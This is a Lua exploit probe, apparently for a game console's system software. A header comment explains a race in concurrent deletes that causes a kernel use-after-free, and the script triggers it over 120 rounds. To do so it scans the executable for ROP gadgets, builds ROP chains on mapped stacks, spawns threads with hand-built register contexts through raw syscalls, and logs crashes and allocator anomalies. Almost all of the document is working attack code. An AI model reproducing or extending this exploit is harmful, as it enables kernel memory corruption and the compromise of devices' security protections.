-- CRASH_CLASS: HIGH
-- PROBE 871a: two concurrent deletes of DIFFERENT ids at the block count boundary
--
-- Path B (block delete) reads the remaining count [T+2] from the entry after the
-- lookup released the table lock, so two callers can hold different stale values.
-- With count==2 and one delete already done, count==1 and the next delete takes
-- path A, which frees C, S, D, P and T itself.  A caller that still believes the
-- count is 2 stays on path B and writes through a freed entry:
--   8ad6ffcd dec r8d / mov [rax+2],r8w     ; through T
--   8ad6fff2 call 0x8ad73e90               ; free(W)
--   8ad70003 mov qword [rcx+rdx*8],0       ; through P
-- No nanosecond window is needed: both callers only have to read the count at
-- different times.  This probe repeats that boundary 120 times with two children
-- released back to back and watches for a death, a bad poll, or an allocator
-- anomaly in the next round.
print("=== PROBE 871a: block count boundary, concurrent different-id deletes ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
local info = memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off=0
    while off < limit do
        local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true)
        if i then return base+off+i-1 end
        off=off+want
    end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end
print(string.format("[A] eboot=%X", ebase))
local sc_mmap=mk(477)
local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local sc669,sc662,sc664 = mk(669),mk(662),mk(664)
local function pairsock()
    local f=memory.alloc(8); wd(f,0xFFFFFFFF); wd(f+4,0xFFFFFFFF)
    local ok,rv=pcall(function() return mk(SOCKETPAIR)(uint64(1),uint64(1),uint64(0),uint64(f)) end)
    return ok and to_num(rv)==0, rd(f) or -1, rd(f+4) or -1, f
end
local KIDS=2
local ROUNDS=120
local both0, one0, other, bad = 0,0,0,0
local left = mmap(page); local stat = mmap(page); local out = mmap(page)
local bufA = mmap(page); local bufB = mmap(page)
for round=1,ROUNDS do
    -- one socketpair, preloaded so both reads complete inside create
    local okp, a, b = pairsock()
    if not okp then print("[B] socketpair failed") break end
    pcall(function() mk(WRITE)(uint64(b),uint64(bufB),uint64(0x200),uint64(0),uint64(0)) end)
    local D = mmap(page); zero(D,page)
    for i=0,KIDS-1 do
        local at=D+i*0x28
        wq(at+0x00,uint64(0)); wq(at+0x08,uint64(0x80)); wq(at+0x10,uint64(bufA)); wq(at+0x18,uint64(left)); wd(at+0x20,a); wd(at+0x24,0)
    end
    local okc, rvc = pcall(function() return sc669(uint64(0x1001),uint64(D),uint64(KIDS),uint64(1),uint64(out)) end)
    local base = rd(out) or 0
    local ids = mmap(page)
    for i=0,KIDS-1 do wd(ids+i*4, base+i*0x10000) end
    pcall(function() sc664(uint64(ids),uint64(KIDS),uint64(stat)) end)
    local s0, s1 = rd(stat) or 0, rd(stat+4) or 0
    if s0 ~= 3 or s1 ~= 3 then
        bad = bad + 1
        print(string.format("[B%d] create rv=%s base=%08X polls=%X/%X (expected 3/3)", round, tostring(rvc), base, s0, s1))
    end
    -- two children, each deleting one id, released back to back
    local sp = {}
    for k=0,KIDS-1 do
        local sk, ca, cb = pairsock()
        local idp = mmap(page); wd(idp, base + k*0x10000)
        local stp = mmap(page)
        local ch = {pop_rdi, idp, pop_rsi, 1, pop_rdx, stp, pop_rax, 662, fn, pop_rax, 431, fn, jmp_g}
        local block = mmap(STACK)
        local sb = block + STACK - 0x200
        for i=1,#ch do wq(sb+(i-1)*8, uint64(ch[i])) end
        local cb2 = mmap(page)
        local ctx = memory.alloc(0x500); zero(ctx,0x500)
        wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
        wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
        wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(sb))
        wq(ctx+Ctx.RDI,uint64(ca)); wq(ctx+Ctx.RSI,uint64(cb2)); wq(ctx+Ctx.RDX,uint64(1)); wq(ctx+Ctx.RAX,uint64(READ))
        local tb=memory.alloc(8); wq(tb,uint64(0))
        local oks,rvs = pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
        sp[#sp+1] = {peer=cb, st=stp, ok=(oks and to_num(rvs)==0)}
    end
    for i=1,#sp do if sp[i].ok then pcall(function() mk(WRITE)(uint64(sp[i].peer),uint64(bufB),uint64(1),uint64(0),uint64(0)) end) end end
    sleep_ms(12)
    local z = 0
    for i=1,#sp do local v = rd(sp[i].st) or 0; if v == 0 then z = z + 1 elseif v ~= 0x80020003 then other = other + 1; print(string.format("[C%d] child%d status=%08X", round, i-1, v)) end end
    if z == 2 then both0 = both0 + 1 elseif z == 1 then one0 = one0 + 1 end
    -- leftovers (if any) and health
    pcall(function() sc664(uint64(ids),uint64(KIDS),uint64(stat)) end)
    local ls0, ls1 = rd(stat) or 0, rd(stat+4) or 0
    if ls0 ~= 0x80020003 or ls1 ~= 0x80020003 then
        print(string.format("[D%d] leftover polls=%08X/%08X", round, ls0, ls1))
    end
    if round % 10 == 0 then print(string.format("[E] round %d both0=%d one0=%d other=%d bad=%d", round, both0, one0, other, bad)) end
end
print(string.format("[Z] rounds=%d both0=%d one0=%d other=%d bad=%d alive=%s", ROUNDS, both0, one0, other, bad,
    tostring(to_num(native.fcall_with_rax(fn_ud, 20)))))
